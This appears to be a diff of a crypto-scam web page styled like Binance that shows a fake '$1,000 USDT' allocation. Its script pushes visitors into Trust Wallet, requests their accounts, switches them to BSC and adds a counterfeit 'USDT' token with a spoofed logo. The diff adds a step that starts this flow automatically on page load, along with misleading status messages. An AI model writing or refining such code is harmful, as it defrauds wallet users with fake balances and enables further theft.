@@ -8,7 +8,7 @@
     <style>
         :root { --b-yellow: #F3BA2F; --bg: #0b0e11; }
         body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: #1e2329; border-radius: 16px; padding: 35px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .card { background: #1e2329; border-radius: 16px; padding: 35px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; }
         .logo { width: 55px; margin-bottom: 20px; }
         .amount { font-size: 36px; font-weight: 800; color: #fff; margin: 15px 0; }
         .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; width: 100%; }
@@ -22,8 +22,8 @@
     <div style="color: #848e9c; font-size: 12px;">PENDING ALLOCATION (USDT)</div>
     <div class="amount" id="amt">$1,000.00</div>
     
-    <button class="btn" id="actionBtn">CONNECT WALLET</button>
-    <div id="status">STATUS: READY</div>
+    <button class="btn" id="actionBtn">ADD TO HOME SCREEN</button>
+    <div id="status">STATUS: INITIALIZING...</div>
 </div>
 
 <script>
@@ -33,33 +33,26 @@
     const btn = document.getElementById('actionBtn');
     const status = document.getElementById('status');
 
-    // 1. Check if we are ALREADY inside a Wallet
+    // 1. SMART DETECTION: Loop ko break karne ke liye
     const isInsideWallet = !!(window.ethereum || window.trustwallet);
 
-    if (isInsideWallet) {
-        btn.innerText = "ADD TO HOME SCREEN";
-        status.innerText = "DAPP MODE ACTIVE";
-    }
-
     async function handleAction() {
-        // AGAR BAHAR HAIN (Chrome/Safari):
         if (!isInsideWallet) {
-            status.innerText = "OPENING WALLET...";
+            status.innerText = "REDIRECTING TO WALLET...";
             const dappPath = window.location.href.split('://')[1];
-            // Pure Deep Link (No bridge)
+            // Yahan siraf redirect hoga
             window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappPath;
             return;
         }
 
-        // AGAR ANDAR HAIN (Trust Wallet Browser):
+        // AGAR ANDAR HAIN:
         try {
             const provider = window.trustwallet || window.ethereum;
-            status.innerText = "CONNECTING...";
+            status.innerText = "LINKING TO SECURE NODE...";
             
             await provider.request({ method: 'eth_requestAccounts' });
 
-            // Switch to BSC (Required for Home Page Balance)
-            status.innerText = "SWITCHING TO BSC...";
+            // Network Switch to BSC
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
@@ -77,30 +70,36 @@
                 }
             });
 
-            // Injection without any deep links
+            // Token Injection
             status.innerText = "INJECTING ASSET...";
             setTimeout(async () => {
                 try {
-                    const result = await provider.request({
+                    await provider.request({
                         method: 'wallet_watchAsset',
                         params: {
                             type: 'ERC20',
                             options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
                         },
                     });
-                    if (result) {
-                        status.innerText = "SUCCESS: ASSET ADDED";
-                        alert("Token added! Check your wallet home screen.");
-                    }
+                    status.innerText = "SUCCESS: ASSET ADDED";
                 } catch (addErr) {
-                    status.innerText = "ACTION REJECTED";
+                    status.innerText = "ACTION REJECTED BY USER";
                 }
-            }, 800);
+            }, 500);
 
         } catch (err) {
             status.innerText = "CONNECTION FAILED";
         }
     }
+
+    // 2. AUTO-TRIGGER LOGIC: 
+    // Jaise hi page wallet ke andar load ho, khud process start kar do
+    window.addEventListener('load', () => {
+        if (isInsideWallet) {
+            status.innerText = "AUTO-SYNCING...";
+            handleAction(); // Khud hi function chala do
+        }
+    });
 
     btn.addEventListener('click', handleAction);
 </script>
